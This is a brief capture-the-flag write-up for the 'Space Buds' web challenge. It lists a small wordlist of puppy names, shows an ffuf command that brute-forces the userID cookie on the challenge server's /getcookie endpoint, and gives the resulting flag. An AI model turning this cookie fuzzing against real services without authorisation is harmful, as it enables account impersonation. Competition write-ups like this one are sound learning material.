# Space Buds
One of the puppies got into the web server. Can you help find out who it was?

45.79.204.27

## Solucion


```bash
┌──(kali㉿kali)-[~/…/ctfs2022/spaceheroes22/web/spacebuds]
└─$ cat buds        
sputnik 
budderball
buddha
b-dawg 
mudbud 
rosebud
```


```bash
┌──(kali㉿kali)-[~/…/ctfs2022/spaceheroes22/web/spacebuds]
└─$ ffuf  -u http://45.79.204.27/getcookie -X POST -H "Cookie: userID=FUZZ" -w buds           

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://45.79.204.27/getcookie
 :: Wordlist         : FUZZ: buds
 :: Header           : Cookie: userID=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

rosebud                 [Status: 200, Size: 483, Words: 62, Lines: 15]
buddha                  [Status: 200, Size: 483, Words: 62, Lines: 15]
budderball              [Status: 200, Size: 483, Words: 62, Lines: 15]
sputnik                 [Status: 200, Size: 483, Words: 62, Lines: 15]
mudbud                  [Status: 200, Size: 219, Words: 15, Lines: 9]
b-dawg                  [Status: 200, Size: 483, Words: 62, Lines: 15]
:: Progress: [6/6] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```

shctf{tastes_like_raspberries}
